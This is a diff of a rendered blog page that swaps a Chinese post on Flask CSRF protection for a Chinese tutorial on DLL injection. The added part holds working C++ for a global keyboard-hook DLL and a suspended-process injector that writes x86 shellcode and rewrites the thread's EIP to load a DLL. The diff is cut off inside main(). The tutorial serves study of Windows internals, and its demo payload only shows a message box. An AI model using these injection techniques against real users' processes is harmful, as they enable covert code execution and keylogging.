+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="c1">// dllmain.cpp : 定义 DLL 应用程序的入口点。
+</span><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&#34;pch.h&#34;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;tchar.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="cp">#pragma warning(disable : 4996)
+</span><span class="cp"></span><span class="n">HHOOK</span> <span class="n">ghHook</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="n">HINSTANCE</span> <span class="n">ghInstance</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="n">LRESULT</span> <span class="n">CALLBACK</span> <span class="nf">KeyboardProc</span><span class="p">(</span>
+    <span class="n">_In_</span> <span class="kt">int</span>    <span class="n">code</span><span class="p">,</span>
+    <span class="n">_In_</span> <span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span>
+    <span class="n">_In_</span> <span class="n">LPARAM</span> <span class="n">lParam</span>
+<span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">TCHAR</span> <span class="n">szPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="p">};</span>
+    <span class="n">TCHAR</span> <span class="n">sProcessName</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span><span class="p">,</span> <span class="p">};</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">code</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">lParam</span> <span class="o">&amp;</span> <span class="mh">0x80000000</span><span class="p">))</span>    <span class="c1">//如果是释放按键
+</span><span class="c1"></span>    <span class="p">{</span>
+        <span class="n">GetModuleFileName</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">szPath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">);</span>
+        <span class="n">_wsplitpath</span><span class="p">(</span><span class="n">szPath</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">sProcessName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">==</span> <span class="n">_wcsicmp</span><span class="p">(</span><span class="n">sProcessName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;notepad&#34;</span><span class="p">))</span>    <span class="c1">//如果进程名是notepad
+</span><span class="c1"></span>        <span class="p">{</span>
+            <span class="n">MessageBox</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;ruokeqx&#34;</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;hello&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>   <span class="c1">//删除消息，不再往下传递
+</span><span class="c1"></span>        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">CallNextHookEx</span><span class="p">(</span><span class="n">ghHook</span><span class="p">,</span> <span class="n">code</span><span class="p">,</span> <span class="n">wParam</span><span class="p">,</span> <span class="n">lParam</span><span class="p">);</span>    <span class="c1">//继续传递消息
+</span><span class="c1"></span><span class="p">}</span>
+
+<span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span>
+                       <span class="n">DWORD</span>  <span class="n">ul_reason_for_call</span><span class="p">,</span>
+                       <span class="n">LPVOID</span> <span class="n">lpReserved</span>
+                     <span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">switch</span> <span class="p">(</span><span class="n">ul_reason_for_call</span><span class="p">)</span>
+    <span class="p">{</span>
+    <span class="k">case</span> <span class="nl">DLL_PROCESS_ATTACH</span><span class="p">:</span>
+        <span class="n">ghInstance</span> <span class="o">=</span> <span class="n">hModule</span><span class="p">;</span><span class="c1">//获得本实例的模块句柄
+</span><span class="c1"></span>        <span class="k">break</span><span class="p">;</span>
+    <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
+    <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
+    <span class="k">case</span> <span class="nl">DLL_PROCESS_DETACH</span><span class="p">:</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">extern</span> <span class="s">&#34;C&#34;</span>
+<span class="p">{</span>
+    <span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">HookStart</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="n">ghHook</span> <span class="o">=</span> <span class="n">SetWindowsHookEx</span><span class="p">(</span><span class="n">WH_KEYBOARD</span><span class="p">,</span> <span class="n">KeyboardProc</span><span class="p">,</span> <span class="n">ghInstance</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">HookStop</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">ghHook</span><span class="p">)</span>
+        <span class="p">{</span>
+            <span class="n">UnhookWindowsHookEx</span><span class="p">(</span><span class="n">ghHook</span><span class="p">);</span>
+            <span class="n">ghHook</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/posts/dll_injection_and_dll_hijacking/SetWindowsHook.png" alt="SetWindowsHook" /></p>
+<h3 id="createprocessopenthread-context-patching">CreateProcess/OpenThread context patching</h3>
+<p>两者都是利用挂起状态进行注入，思路是挂起时写入一段保存挂起状态ip及dll路径及加载函数地址的汇编，将ip改为汇编入口地址，进入汇编加载完dll后再恢复状态。</p>
+<p>这种方式类似调试器注入，要求目标进程是注入者进程的子进程，CreateProcess()这个API第六个参数设置为CREATE_SUSPENDED,进而创建一个挂起状态的进程，这样创建的子进程并不会开始执行且EIP指向ntdll.dll的RtlUserThreadStart函数的开始位置，利用这个进程状态进行DLL注入，然后用ResumeThread()函数恢复进程。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;post&#34;</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;csrf_token&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;{{ csrf_token() }}&#34;</span><span class="p">&gt;</span>
-        账号:<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;username&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-        密码:<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;password&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;password&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
-        <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;提交&#34;</span><span class="p">&gt;</span>
-    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">1.保存所有寄存器的值；
+2.将dll路径首地址压栈；
+3.调用LoadLibrary函数；
+4.恢复所有寄存器的值；
 </code></pre></td></tr></table>
 </div>
-</div><h3 id="源码分析">源码分析</h3>
-<p><a href="https://github.com/wtforms/flask-wtf/blob/main/src/flask_wtf/csrf.py">https://github.com/wtforms/flask-wtf/blob/main/src/flask_wtf/csrf.py</a></p>
-<p>CSRFProtect类中init_app初始先对app进行一些参数的配置并用generate_csrf方法获取随机token并保存到session中；然后对app添加@app.before_request的hook，请求来时先检测app的参数配置，不符合直接return，然后进到protect方法，其中先validate_csrf(self._get_csrf_token())检测token是否与session中一致再使用same_origin方法检测referrer是否同源，如果是最后再表示请求是CSRF valid</p>
-<h2 id="参考文献">参考文献</h2>
-<p>[1] <a href="https://www.cnblogs.com/54chensongxia/p/11693666.html">https://www.cnblogs.com/54chensongxia/p/11693666.html</a> [csrf]<br />
-[2] <a href="https://www.cnblogs.com/leijiangtao/p/11770647.html">https://www.cnblogs.com/leijiangtao/p/11770647.html</a> [flask csrf]<br />
-[3] <a href="http://luckyzmj.cn/posts/a1b686d3.html#">http://luckyzmj.cn/posts/a1b686d3.html#</a>! [CSRFTester]<br />
-[4] <a href="https://blog.csdn.net/neal1991/article/details/114609935">https://blog.csdn.net/neal1991/article/details/114609935</a> [js referer]<br />
-[5] <a href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name">https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name</a> [forbidden header name]<br />
-[6] <a href="https://blog.csdn.net/Forever201295/article/details/80237134">https://blog.csdn.net/Forever201295/article/details/80237134</a> [axios referer forgery]<br />
-[7] <a href="https://developer.chrome.com/docs/extensions/reference/runtime/#method-connect">https://developer.chrome.com/docs/extensions/reference/runtime/#method-connect</a> [runtime.connect]<br />
-[8] <a href="https://uknowsec.cn/posts/notes/CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html">https://uknowsec.cn/posts/notes/CSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</a> [attack csrftester]<br />
-[9] <a href="https://github.com/wtforms/flask-wtf/blob/main/src/flask_wtf/csrf.py">https://github.com/wtforms/flask-wtf/blob/main/src/flask_wtf/csrf.py</a> [flask csrf source code]</p>
+</div><p>还有相同的remote thread context patching，只是一个创建线程 一个创建进程</p>
+<p><img src="/images/posts/dll_injection_and_dll_hijacking/image-20220123004100663.png" alt="image-20220123004100663" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#pragma warning(disable : 4996) 
+</span><span class="cp"></span>  
+<span class="c1">//在子进程创建挂起时注入dll
+</span><span class="c1">//hProcess      被创建时挂起的进程句柄
+</span><span class="c1">//hThread       进程中被挂起的线程句柄
+</span><span class="c1">//szDllPath     被注入的dll的完整路径
+</span><span class="c1"></span><span class="n">BOOL</span> <span class="nf">StartHook</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span><span class="n">szDllPath</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">BYTE</span> <span class="n">ShellCode</span><span class="p">[</span><span class="mi">30</span> <span class="o">+</span> <span class="n">MAX_PATH</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">)]</span> <span class="o">=</span>
+    <span class="p">{</span>
+        <span class="mh">0x60</span><span class="p">,</span>               <span class="c1">//pushad
+</span><span class="c1"></span>        <span class="mh">0x9c</span><span class="p">,</span>               <span class="c1">//pushfd
+</span><span class="c1"></span>        <span class="mh">0x68</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0xcc</span><span class="p">,</span><span class="mh">0xdd</span><span class="p">,</span>   <span class="c1">//push xxxxxxxx(xxxxxxxx的偏移为3)
+</span><span class="c1"></span>        <span class="mh">0xff</span><span class="p">,</span><span class="mh">0x15</span><span class="p">,</span><span class="mh">0xdd</span><span class="p">,</span><span class="mh">0xcc</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span>  <span class="c1">//call [addr]([addr]的偏移为9)
+</span><span class="c1"></span>        <span class="mh">0x9d</span><span class="p">,</span>               <span class="c1">//popfd
+</span><span class="c1"></span>        <span class="mh">0x61</span><span class="p">,</span>               <span class="c1">//popad
+</span><span class="c1"></span>        <span class="mh">0xff</span><span class="p">,</span><span class="mh">0x25</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xbb</span><span class="p">,</span><span class="mh">0xcc</span><span class="p">,</span><span class="mh">0xdd</span><span class="p">,</span>  <span class="c1">//jmp [eip]([eip]的偏移为17)
+</span><span class="c1"></span>        <span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span>        <span class="c1">//保存loadlibraryW函数的地址(偏移为21)
+</span><span class="c1"></span>        <span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span><span class="mh">0xaa</span><span class="p">,</span>        <span class="c1">//保存创建进程时被挂起的线程EIP(偏移为25)
+</span><span class="c1"></span>        <span class="mi">0</span><span class="p">,</span>              <span class="c1">//保存dll路径字符串(偏移为29)
+</span><span class="c1"></span>    <span class="p">};</span>
+    <span class="n">CONTEXT</span> <span class="n">ctx</span><span class="p">;</span>
+    <span class="n">ctx</span><span class="p">.</span><span class="n">ContextFlags</span> <span class="o">=</span> <span class="n">CONTEXT_ALL</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">GetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;GetThreadContext() ErrorCode:[0x%08x]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//在目标进程内存空间调拨一块可执行的内存
+</span><span class="c1"></span>    <span class="n">LPVOID</span> <span class="n">LpAddr</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">30</span> <span class="o">+</span> <span class="n">MAX_PATH</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">),</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">LpAddr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;VirtualAllocEx() ErrorCode:[0x%08x]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//获得LoadLibraryW函数的地址
+</span><span class="c1"></span>    <span class="n">DWORD</span> <span class="n">LoadDllAAddr</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;kernel32.dll&#34;</span><span class="p">),</span> <span class="s">&#34;LoadLibraryW&#34;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">LoadDllAAddr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;GetProcAddress() ErrorCode:[0x%08x]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;原始EIP=0x%08x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Eip</span><span class="p">);</span>
+    <span class="c1">//写入dllpath
+</span><span class="c1"></span>    <span class="n">memcpy</span><span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="n">ShellCode</span> <span class="o">+</span> <span class="mi">29</span><span class="p">),</span> <span class="n">szDllPath</span><span class="p">,</span> <span class="n">MAX_PATH</span><span class="p">);</span>
+    <span class="c1">//写入push xxxxxxxx
+</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">ShellCode</span> <span class="o">+</span> <span class="mi">3</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">LpAddr</span> <span class="o">+</span> <span class="mi">29</span><span class="p">;</span>
+    <span class="c1">//写入loadlibraryA地址
+</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">ShellCode</span> <span class="o">+</span> <span class="mi">21</span><span class="p">)</span> <span class="o">=</span> <span class="n">LoadDllAAddr</span><span class="p">;</span>
+    <span class="c1">//写入call [addr]的[addr]
+</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">ShellCode</span> <span class="o">+</span> <span class="mi">9</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">LpAddr</span> <span class="o">+</span> <span class="mi">21</span><span class="p">;</span>
+    <span class="c1">//写入原始eip
+</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">ShellCode</span> <span class="o">+</span> <span class="mi">25</span><span class="p">)</span> <span class="o">=</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Eip</span><span class="p">;</span>
+    <span class="c1">//写入jmp [eip]的[eip]
+</span><span class="c1"></span>    <span class="o">*</span><span class="p">(</span><span class="n">DWORD</span><span class="o">*</span><span class="p">)(</span><span class="n">ShellCode</span> <span class="o">+</span> <span class="mi">17</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">LpAddr</span> <span class="o">+</span> <span class="mi">25</span><span class="p">;</span>
+    <span class="c1">//把shellcode写入目标进程
+</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">LpAddr</span><span class="p">,</span> <span class="n">ShellCode</span><span class="p">,</span> <span class="mi">30</span> <span class="o">+</span> <span class="n">MAX_PATH</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">TCHAR</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;WriteProcessMemory() ErrorCode:[0x%08x]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">//修改目标进程的EIP，执行被注入的代码
+</span><span class="c1"></span>    <span class="n">ctx</span><span class="p">.</span><span class="n">Eip</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">LpAddr</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">SetThreadContext</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ctx</span><span class="p">))</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;SetThreadContext() ErrorCode:[0x%08x]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;修改后EIP=0x%08x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ctx</span><span class="p">.</span><span class="n">Eip</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">};</span>
+  
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">STARTUPINFO</span> <span class="n">sti</span><span class="p">;</span>
+    <span class="n">PROCESS_INFORMATION</span> <span class="n">proci</span><span class="p">;</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sti</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">));</span>
+    <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">proci</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESS_INFORMATION</span><span class="p">));</span>
+    <span class="n">sti</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFO</span><span class="p">);</span>
+    <span class="c1">// 子进程的名字及启动参数
+</span><span class="c1"></span>    <span class="kt">wchar_t</span> <span class="n">ExeName</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Software</span><span class="se">\\</span><span class="s">ListaryPortable</span><span class="se">\\</span><span class="s">Listary.exe&#34;</span><span class="p">;</span>
+    <span class="c1">// 被注入的dll的完整路径
+</span><span class="c1"></span>    <span class="kt">wchar_t</span> <span class="n">DllName</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">]</span> <span class="o">=</span> <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">ruokeqx</span><span class="se">\\</span><span class="s">source</span><span class="se">\\</span><span class="s">repos</span><span class="se">\\</span><span class="s">InjectionDemo</span><span class="se">\\</span><span class="s">Debug</span><span class="se">\\</span><span class="s">APCDLL.dll&#34;</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">ExeName</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sti</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">proci</span><span class="p">)</span> <span class="o">==</span><span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;CreateProcess() ErrorCode:[0x%08x]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
+        <span class="n">getchar</span><span class="p">();</span>
